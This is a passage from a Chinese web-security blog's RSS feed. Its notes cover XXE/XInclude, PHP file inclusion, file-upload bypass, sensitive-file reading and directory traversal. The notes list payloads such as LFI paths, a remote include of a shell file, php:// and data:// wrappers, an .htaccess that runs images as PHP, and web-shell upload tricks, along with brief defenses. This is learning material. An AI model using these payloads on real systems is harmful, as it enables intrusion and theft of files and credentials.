punctuation&#34;&gt;&amp;lt;&lt;/span&gt;description&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token entity named-entity&#34; title=&#34;&amp;xxe;&#34;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;description&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;core&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;catalog&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;xinclude&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xinclude&#34;&gt;#&lt;/a&gt; XInclude&lt;/h2&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#39;1.0&#39;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;data&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;xmlns:&lt;/span&gt;xi&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://www.w3.org/2001/XInclude&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token namespace&#34;&gt;xi:&lt;/span&gt;include&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://publicServer.com/file.xml&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;token namespace&#34;&gt;xi:&lt;/span&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy53M3NjaG9vbC5jb20uY24veG1sLw==&#34;&gt;XML 教程&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZWN1cml0eS50ZW5jZW50LmNvbS9pbmRleC5waHAvYmxvZy9tc2cvNjk=&#34;&gt;未知攻焉知防 XXE 漏洞攻防&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvOTc4MzMuaHRtbA==&#34;&gt;XXE 攻击笔记分享&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjg4Nw==&#34;&gt;从 XML 相关一步一步到 XXE 漏洞&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/</guid>
            <title>文件包含</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/</link>
            <category>包含</category>
            <category>文件</category>
            <category>目录</category>
            <pubDate>Sat, 26 Nov 2022 21:02:44 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;基础&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基础&#34;&gt;#&lt;/a&gt; 基础&lt;/h2&gt;
&lt;p&gt;常见的文件包含漏洞的形式为  &lt;code&gt;&amp;lt;?php include(&amp;quot;inc/&amp;quot; . $_GET[&#39;file&#39;]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;考虑常用的几种包含方式为&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;同目录包含  &lt;code&gt;file=.htaccess&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;目录遍历  &lt;code&gt;?file=../../../../../../../../../var/lib/locate.db&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;日志注入  &lt;code&gt;?file=../../../../../../../../../var/log/apache/error.log&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;利用  &lt;code&gt;/proc/self/environ&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中日志可以使用 SSH 日志或者 Web 日志等多种日志来源测试&lt;/p&gt;
&lt;h2 id=&#34;触发sink&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#触发sink&#34;&gt;#&lt;/a&gt; 触发 Sink&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;PHP
&lt;ul&gt;
&lt;li&gt;include
&lt;ul&gt;
&lt;li&gt;在包含过程中出错会报错，不影响执行后续语句&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;include_once
&lt;ul&gt;
&lt;li&gt;仅包含一次&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;require
&lt;ul&gt;
&lt;li&gt;在包含过程中出错，就会直接退出，不执行后续语句&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;require_once&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;绕过技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过技巧&#34;&gt;#&lt;/a&gt; 绕过技巧&lt;/h2&gt;
&lt;p&gt;常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式&lt;/p&gt;
&lt;h3 id=&#34;url编码绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#url编码绕过&#34;&gt;#&lt;/a&gt; url 编码绕过&lt;/h3&gt;
&lt;p&gt;如果 WAF 中是字符串匹配，可以使用 url 多次编码的方式可以绕过&lt;/p&gt;
&lt;h3 id=&#34;特殊字符绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#特殊字符绕过&#34;&gt;#&lt;/a&gt; 特殊字符绕过&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;某些情况下，读文件支持使用 Shell 通配符，如  &lt;code&gt;?&lt;/code&gt;   &lt;code&gt;*&lt;/code&gt;  等&lt;/li&gt;
&lt;li&gt;url 中 使用  &lt;code&gt;?&lt;/code&gt;   &lt;code&gt;#&lt;/code&gt;  可能会影响 include 包含的结果&lt;/li&gt;
&lt;li&gt;某些情况下，unicode 编码不同但是字形相近的字符有同一个效果&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;00截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#00截断&#34;&gt;#&lt;/a&gt; %00 截断&lt;/h3&gt;
&lt;p&gt;几乎是最常用的方法，条件是  &lt;code&gt;magic_quotes_gpc&lt;/code&gt;  关闭，而且 php 版本小于 5.3.4。&lt;/p&gt;
&lt;h3 id=&#34;长度截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#长度截断&#34;&gt;#&lt;/a&gt; 长度截断&lt;/h3&gt;
&lt;p&gt;Windows 上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为 259 个 bytes。&lt;/p&gt;
&lt;p&gt;msdn 定义  &lt;code&gt;#define MAX_PATH 260&lt;/code&gt; ，其中第 260 个字符为字符串结尾的  &lt;code&gt;\0&lt;/code&gt;  ，而 linux 可以用 getconf 来判断文件名长度限制和文件路径长度限制。&lt;/p&gt;
&lt;p&gt;获取最长文件路径长度：getconf PATH_MAX /root 得到 4096 获取最长文件名：getconf NAME_MAX /root 得到 255&lt;/p&gt;
&lt;p&gt;那么在长度有限的时候， &lt;code&gt;././././&lt;/code&gt;  (n 个) 的形式就可以通过这个把路径爆掉&lt;/p&gt;
&lt;p&gt;在 php 代码包含中，这种绕过方式要求 php 版本 &amp;lt; php 5.2.8&lt;/p&gt;
&lt;h3 id=&#34;伪协议绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#伪协议绕过&#34;&gt;#&lt;/a&gt; 伪协议绕过&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;远程包含：要求  &lt;code&gt;allow_url_fopen=On&lt;/code&gt;  且  &lt;code&gt;allow_url_include=On&lt;/code&gt;  ， payload 为  &lt;code&gt;?file=[http|https|ftp]://websec.wordpress.com/shell.txt&lt;/code&gt;  的形式&lt;/li&gt;
&lt;li&gt;PHP input: 把 payload 放在 POST 参数中作为包含的文件，要求  &lt;code&gt;allow_url_include=On&lt;/code&gt;  ，payload 为  &lt;code&gt;?file=php://input&lt;/code&gt;  的形式&lt;/li&gt;
&lt;li&gt;Base64: 使用 Base64 伪协议读取文件，payload 为  &lt;code&gt;?file=php://filter/convert.base64-encode/resource=index.php&lt;/code&gt;  的形式&lt;/li&gt;
&lt;li&gt;data: 使用 data 伪协议读取文件，payload 为  &lt;code&gt;?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=&lt;/code&gt;  的形式，要求  &lt;code&gt;allow_url_include=On&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;协议绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#协议绕过&#34;&gt;#&lt;/a&gt; 协议绕过&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;allow_url_fopen&lt;/code&gt;  和  &lt;code&gt;allow_url_include&lt;/code&gt;  主要是针对  &lt;code&gt;http&lt;/code&gt;   &lt;code&gt;ftp&lt;/code&gt;  两种协议起作用，因此可以使用 SMB、WebDav 协议等方式来绕过限制。&lt;/p&gt;
&lt;h2 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY2R4eS5tZS8/cD03NTI=&#34;&gt;Exploit with PHP Protocols&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvbGZpLWNoZWF0LXNoZWV0Lw==&#34;&gt;lfi cheat sheet&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/uploadfile/</guid>
            <title>文件上传</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/uploadfile/</link>
            <category>目录</category>
            <category>上传</category>
            <pubDate>Sat, 26 Nov 2022 20:58:44 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;文件类型检测绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件类型检测绕过&#34;&gt;#&lt;/a&gt; 文件类型检测绕过&lt;/h1&gt;
&lt;h2 id=&#34;更改请求绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#更改请求绕过&#34;&gt;#&lt;/a&gt; 更改请求绕过&lt;/h2&gt;
&lt;p&gt;有的站点仅仅在前端检测了文件类型，这种类型的检测可以直接修改网络请求绕过。 同样的，有的站点在后端仅检查了 HTTP Header 中的信息，比如  &lt;code&gt;Content-Type&lt;/code&gt;  等，这种检查同样可以通过修改网络请求绕过。&lt;/p&gt;
&lt;h2 id=&#34;magic检测绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#magic检测绕过&#34;&gt;#&lt;/a&gt; Magic 检测绕过&lt;/h2&gt;
&lt;p&gt;有的站点使用文件头来检测文件类型，这种检查可以在 Shell 前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;类型&lt;/th&gt;
&lt;th&gt;十六进制值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;JPG&lt;/td&gt;
&lt;td&gt;FF D8 FF E0 00 10 4A 46 49 46&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GIF&lt;/td&gt;
&lt;td&gt;47 49 46 38 39 61&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PNG&lt;/td&gt;
&lt;td&gt;89 50 4E 47&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TIF&lt;/td&gt;
&lt;td&gt;49 49 2A 00&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;BMP&lt;/td&gt;
&lt;td&gt;42 4D&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;后缀绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后缀绕过&#34;&gt;#&lt;/a&gt; 后缀绕过&lt;/h2&gt;
&lt;p&gt;部分服务仅根据后缀、上传时的信息或 Magic Header 来判断文件类型，此时可以绕过。&lt;/p&gt;
&lt;p&gt;php 由于历史原因，部分解释器可能支持符合正则  &lt;code&gt;/ph(p[2-7]?|t(ml)?)/&lt;/code&gt;  的后缀，如  &lt;code&gt;php&lt;/code&gt;  /  &lt;code&gt;php5&lt;/code&gt;  /  &lt;code&gt;pht&lt;/code&gt;  /  &lt;code&gt;phtml&lt;/code&gt;  /  &lt;code&gt;shtml&lt;/code&gt;  /  &lt;code&gt;pwml&lt;/code&gt;  /  &lt;code&gt;phtm&lt;/code&gt;  等 可在禁止上传 php 文件时测试该类型。&lt;/p&gt;
&lt;p&gt;jsp 引擎则可能会解析  &lt;code&gt;jspx&lt;/code&gt;  /  &lt;code&gt;jspf&lt;/code&gt;  /  &lt;code&gt;jspa&lt;/code&gt;  /  &lt;code&gt;jsw&lt;/code&gt;  /  &lt;code&gt;jsv&lt;/code&gt;  /  &lt;code&gt;jtml&lt;/code&gt;  等后缀，asp 支持  &lt;code&gt;asa&lt;/code&gt;  /  &lt;code&gt;asax&lt;/code&gt;  /  &lt;code&gt;cer&lt;/code&gt;  /  &lt;code&gt;cdx&lt;/code&gt;  /  &lt;code&gt;aspx&lt;/code&gt;  /  &lt;code&gt;ascx&lt;/code&gt;  /  &lt;code&gt;ashx&lt;/code&gt;  /  &lt;code&gt;asmx&lt;/code&gt;  /  &lt;code&gt;asp&amp;#123;80-90&amp;#125;&lt;/code&gt;  等后缀。&lt;/p&gt;
&lt;p&gt;除了这些绕过，其他的后缀同样可能带来问题，如  &lt;code&gt;vbs&lt;/code&gt;  /  &lt;code&gt;asis&lt;/code&gt;  /  &lt;code&gt;sh&lt;/code&gt;  /  &lt;code&gt;reg&lt;/code&gt;  /  &lt;code&gt;cgi&lt;/code&gt;  /  &lt;code&gt;exe&lt;/code&gt;  /  &lt;code&gt;dll&lt;/code&gt;  /  &lt;code&gt;com&lt;/code&gt;  /  &lt;code&gt;bat&lt;/code&gt;  /  &lt;code&gt;pl&lt;/code&gt;  /  &lt;code&gt;cfc&lt;/code&gt;  /  &lt;code&gt;cfm&lt;/code&gt;  /  &lt;code&gt;ini&lt;/code&gt;  等。&lt;/p&gt;
&lt;h2 id=&#34;系统命名绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#系统命名绕过&#34;&gt;#&lt;/a&gt; 系统命名绕过&lt;/h2&gt;
&lt;p&gt;在 Windows 系统中，上传  &lt;code&gt;index.php.&lt;/code&gt;  会重命名为  &lt;code&gt;.&lt;/code&gt;  ，可以绕过后缀检查。 也可尝试  &lt;code&gt;index.php%20&lt;/code&gt;  ，  &lt;code&gt;index.php:1.jpg&lt;/code&gt;   &lt;code&gt;index.php::$DATA&lt;/code&gt;  等。 在 Linux 系统中，可以尝试上传名为  &lt;code&gt;index.php/.&lt;/code&gt;  或  &lt;code&gt;./aa/../index.php/.&lt;/code&gt;  的文件&lt;/p&gt;
&lt;h2 id=&#34;userini&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#userini&#34;&gt;#&lt;/a&gt; .user.ini&lt;/h2&gt;
&lt;p&gt;在 php 执行的过程中，除了主  &lt;code&gt;php.ini&lt;/code&gt;  之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER [&#39;DOCUMENT_ROOT&#39;] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。  &lt;code&gt;.user.ini&lt;/code&gt;  中可以定义除了 PHP_INI_SYSTEM 以外的模式的选项，故可以使用  &lt;code&gt;.user.ini&lt;/code&gt;  加上非 php 后缀的文件构造一个 shell，比如  &lt;code&gt;auto_prepend_file=01.gif&lt;/code&gt;  。&lt;/p&gt;
&lt;h2 id=&#34;waf绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#waf绕过&#34;&gt;#&lt;/a&gt; WAF 绕过&lt;/h2&gt;
&lt;p&gt;有的 waf 在编写过程中考虑到性能原因，只处理一部分数据，这时可以通过加入大量垃圾数据来绕过其处理函数。&lt;/p&gt;
&lt;p&gt;另外，Waf 和 Web 系统对  &lt;code&gt;boundary&lt;/code&gt;  的处理不一致，可以使用错误的  &lt;code&gt;boundary&lt;/code&gt;  来完成绕过。&lt;/p&gt;
&lt;h2 id=&#34;竞争上传绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#竞争上传绕过&#34;&gt;#&lt;/a&gt; 竞争上传绕过&lt;/h2&gt;
&lt;p&gt;有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成 Web Shell 的文件并尝试访问，多次之后即可获得 Shell。&lt;/p&gt;
&lt;h1 id=&#34;攻击技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击技巧&#34;&gt;#&lt;/a&gt; 攻击技巧&lt;/h1&gt;
&lt;h2 id=&#34;apache重写getshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache重写getshell&#34;&gt;#&lt;/a&gt; Apache 重写 GetShell&lt;/h2&gt;
&lt;p&gt;Apache 可根据是否允许重定向考虑上传.htaccess&lt;/p&gt;
&lt;p&gt;内容为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;AddType application/x-httpd-php .png
php_flag engine 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;就可以用 png 或者其他后缀的文件做 php 脚本了&lt;/p&gt;
&lt;h2 id=&#34;软链接任意读文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#软链接任意读文件&#34;&gt;#&lt;/a&gt; 软链接任意读文件&lt;/h2&gt;
&lt;p&gt;上传的压缩包文件会被解压的文件时，可以考虑上传含符号链接的文件 若服务器没有做好防护，可实现任意文件读取的效果&lt;/p&gt;
&lt;h1 id=&#34;防护技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防护技巧&#34;&gt;#&lt;/a&gt; 防护技巧&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;使用白名单限制上传文件的类型&lt;/li&gt;
&lt;li&gt;使用更严格的文件类型检查方式&lt;/li&gt;
&lt;li&gt;限制 Web Server 对上传文件夹的解析&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4ODQ2NC5odG1s&#34;&gt;构造优质上传漏洞 Fuzz 字典&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/readfile/</guid>
            <title>文件读取</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/readfile/</link>
            <category>目录</category>
            <category>读取</category>
            <pubDate>Sat, 26 Nov 2022 20:49:44 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;考虑读取可能有敏感信息的文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户目录下的敏感文件
&lt;ul&gt;
&lt;li&gt;.bash_history&lt;/li&gt;
&lt;li&gt;.zsh_history&lt;/li&gt;
&lt;li&gt;.profile&lt;/li&gt;
&lt;li&gt;.bashrc&lt;/li&gt;
&lt;li&gt;.gitconfig&lt;/li&gt;
&lt;li&gt;.viminfopasswd&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;应用的配置文件
&lt;ul&gt;
&lt;li&gt;/etc/apache2/apache2.conf&lt;/li&gt;
&lt;li&gt;/etc/nginx/nginx.conf&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;应用的日志文件
&lt;ul&gt;
&lt;li&gt;/var/log/apache2/access.log&lt;/li&gt;
&lt;li&gt;/var/log/nginx/access.log&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;站点目录下的敏感文件
&lt;ul&gt;
&lt;li&gt;.svn/entries&lt;/li&gt;
&lt;li&gt;.git/HEAD&lt;/li&gt;
&lt;li&gt;WEB-INF/web.xml&lt;/li&gt;
&lt;li&gt;.htaccess&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;特殊的备份文件
&lt;ul&gt;
&lt;li&gt;.swp&lt;/li&gt;
&lt;li&gt;.swo&lt;/li&gt;
&lt;li&gt;.bak&lt;/li&gt;
&lt;li&gt;index.php~&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python 的 Cache
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;__pycache__\__init__.cpython-35.pyc&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/directory%20traversal/</guid>
            <title>目录穿越</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/directory%20traversal/</link>
            <category>绕过</category>
            <category>遍历</category>
            <pubDate>Sat, 26 Nov 2022 20:44:44 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;目录穿越（也被称为目录遍历 /directory traversal/path traversal）是通过使用  &lt;code&gt;../&lt;/code&gt;  等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。&lt;/p&gt;
&lt;h1 id=&#34;攻击载荷&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击载荷&#34;&gt;#&lt;/a&gt; 攻击载荷&lt;/h1&gt;
&lt;h2 id=&#34;url参数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#url参数&#34;&gt;#&lt;/a&gt; URL 参数&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;../&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;..\&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;..;/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nginx-off-by-slash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nginx-off-by-slash&#34;&gt;#&lt;/a&gt; Nginx Off by Slash&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;https://vuln.site.com/files../&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;unc-bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#unc-bypass&#34;&gt;#&lt;/a&gt; UNC Bypass&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;\\localhost\c$\windows\win.ini&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;过滤绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过滤绕过&#34;&gt;#&lt;/a&gt; 过滤绕过&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;单次替换&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;...//&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;URL 编码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;16 位 Unicode 编码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;\u002e&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;超长 UTF-8 编码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;\%e0%40%ae&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h1&gt;
&lt;p&gt;在进行文件操作相关的 API 前，应该对用户输入做过滤。较强的规则下可以使用白名单，仅允许纯字母或数字字符等。&lt;/p&gt;
&lt;p&gt;若规则允许的字符较多，最好使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2ZpbGUtcGF0aC10cmF2ZXJzYWw=&#34;&gt;Directory traversal by portswigger&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9QYXRoX1RyYXZlcnNhbA==&#34;&gt;Path Traversal by OWASP&lt;/span&gt;&lt;/li&gt;
